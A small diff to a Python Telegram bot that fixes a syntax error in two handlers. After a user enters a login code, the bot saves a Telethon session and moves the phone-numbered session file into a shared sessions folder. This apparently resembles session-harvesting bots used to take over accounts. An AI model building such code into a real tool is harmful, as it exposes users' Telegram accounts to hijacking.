@@ -149,7 +149,7 @@ async def inline_click(call: types.CallbackQuery):
 
             sessionString = StringSession(sessionString)
             await client111.client.disconnect()
-            shutil.move(f"./{client111.phone_number}.session"1, "../../sessions")
+            shutil.move(f"./{client111.phone_number}.session", "../../sessions")
 
             await call.message.reply(config.textInfo["validCodeText"])
 
@@ -222,7 +222,7 @@ async def code_step(message: types.Message):
         sessionString = StringSession.save(client111.client.session)
         sessionString = StringSession(sessionString)
         await client111.client.disconnect()
-        shutil.move(f"./{client111.phone_number}.session"1, "../../sessions")
+        shutil.move(f"./{client111.phone_number}.session", "../../sessions")
 
         await message.reply(config.textInfo["validCodeText"])
 
